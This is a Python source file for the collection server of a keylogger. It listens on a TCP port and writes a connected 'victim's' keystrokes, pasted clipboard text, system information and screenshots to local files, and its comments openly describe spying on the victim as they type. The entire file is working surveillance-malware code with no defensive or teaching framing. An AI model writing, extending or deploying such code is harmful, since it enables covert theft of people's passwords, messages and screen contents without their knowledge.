
import socket
import os

serverHost = 'localhost'
severPort = 9999

# Create a TCP/IP socket
severSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
severSocket.bind((serverHost,severPort))
severSocket.listen(1)

# Accept a connection
print("Waiting for a connection...")
connection, clientAddress = severSocket.accept()
print("Connection with:", clientAddress)

# Open a file to write the received data
with open("keylogger.txt", 'a') as keylog:
    while True:
        # Receive data from the client
        data = connection.recv(1024)
        if not data:
            break
        if data == b'backspace':
            # Remove the last character from the text
            keylog.seek(0, 2)  # Move the cursor to the end of the file
            keylog.seek(keylog.tell() - 1)  # Move the cursor one character back
            keylog.truncate()  # Remove the last character

        elif data == b'screenshot_name':
            screenshot_name = connection.recv(1024).decode()
            with open(screenshot_name, 'wb') as screenshot_file:
                while True:
                    screenshot_data = connection.recv(1024)
                    if screenshot_data == b'Done':
                        break
                    screenshot_file.write(screenshot_data)
                print(f"Received {screenshot_name}")
        elif data == b'system_info':
            system_info = connection.recv(1024).decode()
            keylog.write(system_info + '\n')
            keylog.write('*' * 100 + '\n')
            keylog.flush()
            os.fsync(keylog.fileno())
        elif data == b'paste':
            pastedData = connection.recv(1024)
            keylog.write(pastedData.decode() + '\n')
            # Write data in file in the same time that victim write on keyboard
            keylog.flush()
            os.fsync(keylog.fileno())
            print(pastedData.decode())
        else:
            if not len(data) == 1:
                print(data.decode())
            else:
                keylog.write(data.decode())
                # Write data in file in the same time that victim write on keyboard
                keylog.flush() 
                os.fsync(keylog.fileno())  

connection.close()
